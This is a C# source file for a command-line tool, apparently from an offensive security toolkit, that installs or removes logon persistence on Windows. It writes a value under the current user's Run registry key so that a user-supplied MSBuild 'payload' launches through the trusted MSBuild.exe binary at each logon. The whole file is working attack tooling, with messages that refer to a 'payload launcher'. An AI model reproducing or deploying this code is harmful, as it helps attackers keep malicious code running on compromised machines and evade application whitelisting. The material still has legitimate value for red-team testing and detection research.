using System;
using System.Text;
using CommandLine;
using CommandLine.Text;

namespace Install_RegPersistence
{
    class Program
    {

        public class Options
        {

            [Option('u', "Uninstall", Required = false, DefaultValue = false, HelpText = "Uninstalls Reg Persistence")]
            public bool Remove { get; set; }

            [Option('i', "Install", Required = false, DefaultValue = false, HelpText = "Installs Reg Persistence")]
            public bool Install { get; set; }

            [Option('t', "RunKey", Required = true, DefaultValue = null, HelpText = "Desired Reg Run Key Name")]
            public string RunKey { get; set; }

            [Option('p', "Path", Required = false, DefaultValue = null, HelpText = "Path to msbuild payload")]
            public string Path { get; set; }

            [HelpOption]
            public string GetUsage()
            {
                var usage = new StringBuilder();
                {
                    return HelpText.AutoBuild(this, (HelpText current) => HelpText.DefaultParsingErrorsHandler(this, current));
                }
            }
        }

        public static void Main(string[] args)
        {
            Options ops = new Options();
            CommandLine.Parser.Default.ParseArguments(args, ops);

  
            string launcher = $"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSbuild.exe {ops.Path}";

            if (ops.Install is true)
            {
                if (ops.Path is null)
                {
                    Console.WriteLine("[*] Please provide a path to the msbuild payload!");
                    System.Environment.Exit(0);
                }
                else if (ops.RunKey is null)
                {
                    Console.WriteLine("[*] Please provide a Run Key name to add! (example: 'Startup')");
                    System.Environment.Exit(0);
                }
                else { } 
                Microsoft.Win32.RegistryKey launcherkey;
                launcherkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                launcherkey.SetValue(ops.RunKey, launcher);
                launcherkey.Close();
                Console.WriteLine($"[*] Payload launcher stored in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{ops.RunKey}");
            }
            else
            {
                if (ops.Remove is true)
                {
                    if (ops.RunKey is null)
                    {
                        Console.WriteLine("[*] Please provide a Run Key name to remove!  (example: 'Startup')");
                    }
                    Microsoft.Win32.RegistryKey launcherkeys;
                    launcherkeys = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    launcherkeys.DeleteValue(ops.RunKey);
                    launcherkeys.Close();
                    Console.WriteLine($"[*] Payload launcher removed from HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{ops.RunKey}");
                }
                else
                {
                    if ((ops.Install is true) && (ops.Remove is true) || (ops.Install is false) && (ops.Remove is false))
                    {
                        Console.WriteLine("[*] You must choose Install (-i) OR Remove (-u). Type \"-?\" for help.");
                        System.Environment.Exit(0);
                    }
                    else { }
                }
            }
        }
    }
}